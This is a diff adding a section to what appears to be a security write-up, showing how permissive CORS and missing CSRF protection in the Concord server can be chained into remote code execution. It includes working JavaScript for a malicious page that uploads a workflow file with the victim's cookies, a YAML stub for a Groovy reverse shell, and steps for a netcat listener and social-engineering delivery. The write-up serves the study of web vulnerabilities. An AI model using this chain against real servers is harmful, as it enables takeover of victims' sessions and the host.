@@ -115,3 +115,86 @@ The combination of permissive CORS headers + missing SameSite attributes + no CS
 - **CORS-based attacks** (reading sensitive data)
 - **CSRF attacks** (performing privileged actions)
 ### Exploiting Permissive CORS and CSRF to get an RCE
+
+#### Attack Strategy
+Since Concord has permissive CORS headers, an attacker can create a malicious website that authenticated users visit. This site will execute JavaScript in the victim's browser to interact with Concord using their session cookies.
+
+#### Finding the Right Endpoint
+The attacker searches Concord's API documentation for exploitable endpoints that work with the CORS restrictions:
+- **GET requests** (no preflight needed)
+- **POST requests** with standard content-types like `multipart/form-data`
+
+##### Target Found: Process API
+The `/api/v1/process` endpoint allows starting a "process" (code execution) with:
+- **Method**: POST with `multipart/form-data` (no preflight required)
+- **Payload**: Upload a `concord.yml` file containing executable flows
+- **Authentication**: Uses cookies (works with CORS + credentials)
+
+#### Building the Payload
+
+##### 1. Concord.yml File
+Creates a YAML file that executes a Groovy reverse shell:
+```yaml
+configuration:
+  dependencies:
+    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"
+flows:
+  default:
+    - script: groovy
+      body: |
+         # Groovy reverse shell code connecting to attacker's server
+```
+
+##### 2. Malicious Website
+Creates an HTML page with JavaScript that:
+1. **Checks authentication**: Calls `/api/service/console/whoami` to verify user is logged in
+2. **Sends payload**: If authenticated, uploads the malicious `concord.yml` file via POST to `/api/v1/process`
+3. **Exfiltrates data**: Sends responses back to attacker's server
+
+```javascript
+// Check if user is authenticated
+fetch("http://concord:8001/api/service/console/whoami", {
+    credentials: 'include'  // Include cookies
+})
+.then(async (response) => {
+    if(response.status != 401){
+        // User is logged in - execute attack
+        rce();
+    }
+})
+
+function rce() {
+    var ymlBlob = new Blob([yml], { type: "application/yml" });
+    var fd = new FormData();
+    fd.append('concord.yml', ymlBlob);
+    fetch("http://concord:8001/api/v1/process", {
+        credentials: 'include',
+        method: 'POST',
+        body: fd
+    })
+}
+```
+
+#### Attack Execution
+1. **Setup**: Start netcat listener on port 9000
+2. **Deliver**: Send malicious website link to authenticated Concord user
+3. **Execute**: When user visits the page:
+   - JavaScript checks authentication status
+   - If logged in, uploads malicious YAML file
+   - Concord executes the Groovy script
+   - Reverse shell connects back to attacker
+
+#### Results
+- **Information disclosure**: Retrieved user details (`concordAgent`)
+- **Remote code execution**: Successfully obtained shell access on Concord server
+- **Process creation**: Concord confirmed new process with instance ID
+
+#### Key Success Factors
+1. **Permissive CORS**: `Access-Control-Allow-Credentials: true` with reflected origins
+2. **Missing SameSite**: Cookies sent with cross-site requests
+3. **No CSRF tokens**: No additional protection against state-changing requests
+4. **Dangerous API endpoint**: Process creation allows arbitrary code execution
+5. **Standard content-type**: `multipart/form-data` bypasses preflight requirements
+
+This demonstrates how CORS misconfigurations combined with missing CSRF protections can lead to complete system compromise through social engineering.
+**Script sent to the victim:** 
